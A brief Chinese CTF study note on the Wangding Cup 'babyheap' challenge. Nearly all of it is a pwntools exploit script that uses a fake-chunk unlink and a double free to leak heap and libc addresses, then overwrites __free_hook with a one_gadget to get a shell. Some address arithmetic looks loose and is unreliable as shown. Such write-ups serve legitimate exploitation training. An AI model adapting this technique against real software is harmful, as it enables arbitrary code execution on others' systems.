### day2：Unlink

今天就学一波之前网鼎杯落下的babyheap



突然一天就一堆事情想说晚上可能专心学一学结果还被搞得不怎么开心就理了下思路

```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./babyheap')
elf = ELF('./babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def new(idx,content):
	n.recvuntil('Choice:')
	n.sendline('1')
	n.recvuntil('Index:')
	n.sendline(str(idx))
	n.recvuntil('Content:')
	n.send(content)

def edit(idx,content):
	n.recvuntil('Choice:')
	n.sendline("2")
	n.recvuntil('Index:')
	n.sendline(str(idx))
	n.recvuntil('Content:')
	n.send(content)

def show(idx):
	n.recvuntil('Choice:')
	n.sendline("3")
	n.recvuntil('Index:')
	n.sendline(str(idx))

def free(idx):
    n.recvuntil('Choice:')
    n.sendline("4")
    n.recvuntil('Index:')
    n.sendline(str(idx))

#double free
new(0,'aaaa\n')
new(1,'bbbb\n')
new(2,'cccc\n')
new(3,'dddd\n')

#unlink
ptr = 0x602000 + 0x20*4
fake_chunk  = p64(0) + p64(0x31) 
fake_chunk += p64(ptr - 0x18) + p64(ptr - 0x10)

new(4, fake_chunk)

check_fb = p64(0x30) + p64(0x30)
new(5, check_fb+'\n')

#leak heapbase
free(1)
free(0)
show(0)
heap_base = u64(n.recv(6)[0:3]+'\x00'*5)-0x30
print hex(heap_base)
#gdb.attach(n)

edit(0, p64(heap_base + 0x20) + p64(0) + p64(0) + p64(0x31))

new(6, p64(0) + p64(0xa1)+'\n')
new(7, p64(0) + p64(0xa1)+'\n')
#gdb.attach(n)

free(1)
#gdb.attach(n)
show(1)

libc_base = u64(n.recv(6)+'\x00\x00')
print hex(libc_base)

free_hook = libc_base + libc.symbols['__free_hook']
edit(4,p64(free_hook)+'\n')
one_gadget = p64(libc_base + 0x4526a)
edit(1,one_gadget[:-1]+'\n')

free(1)

n.interactive()
```

